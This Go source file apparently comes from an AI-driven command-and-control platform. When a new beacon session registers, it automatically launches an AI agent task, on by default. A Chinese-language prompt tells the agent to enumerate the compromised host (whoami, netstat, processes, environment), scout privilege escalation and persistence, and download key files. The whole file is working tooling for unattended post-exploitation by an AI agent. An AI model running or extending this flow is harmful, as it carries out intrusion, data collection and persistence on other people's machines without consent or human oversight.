package server

import (
	"fmt"
	"log"
	"strings"

	"github.com/RestXtra/RestXtraAI/db"
)

// c2AutoPostexSetting gates the automatic post-exploitation flow on new beacon
// sessions. Default on.
const c2AutoPostexSetting = "c2_auto_postex"

func (s *Server) c2AutoPostexEnabled() bool {
	v, _, _ := s.m.pg.GetSetting(c2AutoPostexSetting)
	return v != "off"
}

// startAutoPostex launches a RestXtraAI task that drives the post-exploitation
// flow against a freshly-registered C2 beacon session. The task runs on the
// platform's planner/worker engine; the worker has c2_postex / c2_task_result
// bound so the AI can execute modules and collect structured results.
func (s *Server) startAutoPostex(listenerID int64, sessionID, host string) {
	if s.c2m == nil || !s.c2AutoPostexEnabled() {
		return
	}
	if strings.TrimSpace(sessionID) == "" {
		return
	}
	desc := fmt.Sprintf("C2 后渗透 · %s", sessionID)
	goal := fmt.Sprintf(
		"对 C2 会话 %s（主机 %s）执行标准后渗透流程并输出发现报告。\n"+
			"流程：\n"+
			"1. 用 c2_postex 依次执行 info、whoami、netstat、ps、users、env 收集基础信息（每次用 c2_task_result 轮询结果）；\n"+
			"2. 根据系统类型执行 escalate（提权侦察）与 persist（持久化侦察）；\n"+
			"3. 需要时用 download 获取关键文件、ls 浏览目录；\n"+
			"4. 汇总输出：主机指纹(OS/内核/主机名)、开放端口与网络连接、当前用户与权限、提权机会、持久化机会、可疑进程。\n"+
			"工具约定：c2_postex 的 session_id 固定为 %s，module 为模块名；c2_task_result 传回 task_id 取结果。",
		sessionID, host, sessionID)

	t, err := s.m.CreateTask(desc, goal, nil, 0, 0, nil)
	if err != nil {
		log.Printf("[c2] 自动后渗透任务创建失败 (%s): %v", sessionID, err)
		return
	}
	log.Printf("[c2] 新会话 %s 自动启动后渗透任务 #%s", sessionID, t.ID)
	s.seed(t, desc+" "+goal)

	// Mirror the interactive createTask flow: decompose goals, then run the engine.
	go func() {
		s.engine.emitActivity(t, db.Activity{Worker: "planner", Kind: "round",
			Summary: "第 0 轮目标拆解（自动后渗透）"})
		goals := s.createGoals(s.ctx, t, func(r db.Activity) {
			s.engine.emitActivity(t, r)
		})
		for _, g := range goals {
			summary := g.Text
			if g.VulnClass != "" {
				summary = fmt.Sprintf("[%s] %s", g.VulnClass, g.Text)
			}
			s.engine.emitActivity(t, db.Activity{Worker: "planner", Kind: "text", Summary: summary})
		}
		s.engine.Run(s.ctx, t)
	}()
}
